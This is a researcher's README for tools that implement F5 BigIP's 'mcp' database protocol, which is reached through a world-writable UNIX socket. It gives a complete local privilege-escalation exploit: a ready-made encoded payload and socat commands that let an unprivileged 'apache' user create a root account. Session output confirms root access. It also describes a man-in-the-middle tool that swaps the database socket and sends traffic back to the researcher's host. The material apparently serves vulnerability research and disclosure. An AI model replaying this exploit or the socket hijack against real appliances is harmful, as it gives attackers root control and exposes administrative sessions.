This isn't really done or ready yet, but I wanted to get the code checked in.

This basically implements F5's database protocol, "mcp", which operates through
a UNIX domain socket.

# What is mcp?

MCP is a proprietary (AFAICT) database used by F5 BigIP. It's accessed through
`/var/run/mcp`, a UNIX domain socket with 0777 permissions (ie, any user can
access it).

The protocol is TLV-style, which a whole bunch of types (over 41,000). They're
all listed in [mcp-objects.txt](/mcp-objects.txt).

I implemented a parser that you can find in [mcp-parser.rb](/mcp-parser.rb),
and you can find a bunch of different messages in
[mcp-parser-tests.rb](/mcp-parser-tests.rb).

I also created a builder, [mcp-builder.rb](/mcp-builder.rb), although it's not
really designed to be easy to use. We do have a pre-defined function that
creates an MCP packet that creates a root-level user account, which is pretty
cool. You can use `mcp-privesc.rb` to create that packet.

# Building and Sending MCP Messages

To communicate with MCP directly, you'll generally use `socat`. The code in
`mcp-builder.rb` can create packets (though currently only does privilege
escalation via `mcp-privesc.rb`).

To use `mcp-privesc.rb`, run it and find a way to send the output into a
socket. You can provide optional username / password parameters as well. Here's
an example where we gzip + base64-encode the output:

```
$ ruby ./mcp-privesc.rb blogtest MyFunPW | gzip | base64 -w0
Attempting to create a crypt-sha512 hash of the password
Writing an `mcp` message to stdout that'll create an account: blogtest / $6$vdznqfyc$q9LEJmhlDZK3HQY0L0WuiKfXaKJtQmOY7lIkMS/IxftTmZs.PdlYXxmxjRQ4f529gl13NsqWlZdd/eksunJT01
Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin

H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxR5KPA8oYCLGBaU4ANbBwXA0dSTn56SWpxiQA7RKcAB8yiaMecnFgg8yAWg3ZyC4LpjdxC6AbJnwSLcDCwOefn5ubnCcZDDOaWBItzM3DqJ2Xm6SclFmdwi4ClGLmFwVIpDEkqZiplKVV5hWmVySqFlj6uXrkZOS5R3sYegZEGPgbhpZneaRGJ3l4lgbn+keY5ntm+wfqeFWklIblRxXoBKTmRERW5FVlBgSZppkaW6TmGxn7FheE5USkp+qnZxaV5XiEGhmCnIXsoD+wRBgAyeb1ueQEAAA==
```

Then we can copy and paste it to the F5 BigIP target, and send it using this
command (not that we're doing this as a non-root user as a demonstration):

```
$ whoami
apache

$ echo -ne 'H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxR5KPA8oYCLGBaU4ANbBwXA0dSTn56SWpxiQA7RKcAB8yiaMecnFgg8yAWg3ZyC4LpjdxC6AbJnwSLcDCwOefn5ubnCcZDDOaWBItzM3DqJ2Xm6SclFmdwi4ClGLmFwVIpDEkqZiplKVV5hWmVySqFlj6uXrkZOS5R3sYegZEGPgbhpZneaRGJ3l4lgbn+keY5ntm+wfqeFWklIblRxXoBKTmRERW5FVlBgSZppkaW6TmGxn7FheE5USkp+qnZxaV5XiEGhmCnIXsoD+wRBgAyeb1ueQEAAA==' | base64 -d | gunzip - | socat -t100 - UNIX-CONNECT:/var/run/mcp | gzip | base64 -w0
H4sIAB91UGMAA2NgYJBjQALcIQy8QEqMO5SBFcwPZ+AR0OCOAJKaYAUEVXNHgVRzCzIwAABM8W1YXAAAAA==

bash-4.2$ su blogtest
Password: 
[...]

[blogtest@localhost:NO LICENSE:Standalone] config # whoami
root
```

We can also parse the response we got using `mcp-parser.rb`:

```
$ echo -ne 'H4sIAB91UGMAA2NgYJBjQALcIQy8QEqMO5SBFcwPZ+AR0OCOAJKaYAUEVXNHgVRzCzIwAABM8W1YXAAAAA==' | base64 -d | gunzip - | ruby ./mcp-parser.rb 
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = user_authenticated
 result_type (tag) = user_authenticated_name
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = create
 result_type (tag) = userdb_entry
```

You can, of course, do it all as a single command, although that doesn't really make sense for our `privesc` command, considering we're already root:

```
$ ruby ./mcp-privesc.rb blogtest2 MyFunPW | ssh root@10.0.0.162 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb
Attempting to create a crypt-sha512 hash of the password
Writing an `mcp` message to stdout that'll create an account: blogtest2 / $6$dufuourf$gfuhZJZcXpfjcOTdyJdwsoLLX4EVwn7M9lDxk3LqDtj0PhwZS6Av2ua363xyzqNQFhVOWSiT3eYkInQN/aDkg.
Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin

result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = user_authenticated
 result_type (tag) = user_authenticated_name
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = create
 result_type (tag) = userdb_entry

ron@fedora ~/shared/analysis/f5-big-ip-0day/analysis/mcp/parser [main]× $ ssh blogtest2@10.0.0.162
(blogtest2@10.0.0.162) Password: 
(blogtest2@10.0.0.162) You are required to change your password immediately (root enforced)
[...]

[blogtest2@localhost:NO LICENSE:Standalone] ~ # whoami
root
```

# Connection Eavesdropping

I also wrote a tool to inspect/log database queries in real time -
[mcp-mitm.rb](/mcp-mitm.rb). This isn't an exploit, it's just an analysis tool
that requires a root login. Effectively, it moves `/var/run/mcp` and replaces
it with a socket that we control, then parses all the messages going through it.

To run it:

* Ensure the server isn't being used for anything important - this is somewhere between "destructive" and "interrupty" because we yoink the database socket (it does try to fix it after!)
* Ensure the F5 Big-IP host can connect back to you on any two ports (1234 and 1235 by default)
* Ensure you can `ssh root@<target>` with no password or other input (or edit the code and turn off `DO_SETUP`)

Pretty much any potential "damage" is fixed with a reboot, since it creates the
socket at boot, but you probably don't wanna do that on prod.

Anyway, execute with no args to get the usage, then fill in the important IP
addresses:

```
$ ruby ./mcp-mitm.rb
Usage: ruby ./mcp-mitm.rb <your ip> <target ip> [listen port 1] [listen port 2]
[...]

$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162

$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162
Configuration (edit the script to change, this is a PoC!):

Your IP: 10.0.0.179
Target IP: 10.0.0.162
Listening port 1: 1234
Listening port 2: 1235
SSH into the target to set things up: true
  (Make sure you can ssh into the host as root with no password)
  (Yes yes, I know it's a PoC!)
SSH'ing into the server to set things up
Ready!
```

If you wait around (or do stuff on the server), you'll see sessions:

```
Received session @ #<TCPSocket:0x000000000170d630> <--> #<TCPSocket:0x000000000170d658>

user_authenticated (structure [15 bytes]):
 user_authenticated_name (string [7 bytes]) = "admin"

start_transaction (structure [8 bytes]):
 start_transaction_load_type (ulong) = 0x00000000 (0)
[...]
```

Ctrl-c will stop it, and fix the socket:

```
^CSSH'ing into the server to fix things
Session 1 closed?
Ending thread
Ending thread
Traceback (most recent call last):
        3: from ./mcp-mitm.rb:149:in `<main>'
        2: from ./mcp-mitm.rb:149:in `loop'
        1: from ./mcp-mitm.rb:151:in `block in <main>'
./mcp-mitm.rb:151:in `accept': Interrupt
```

And that's it!
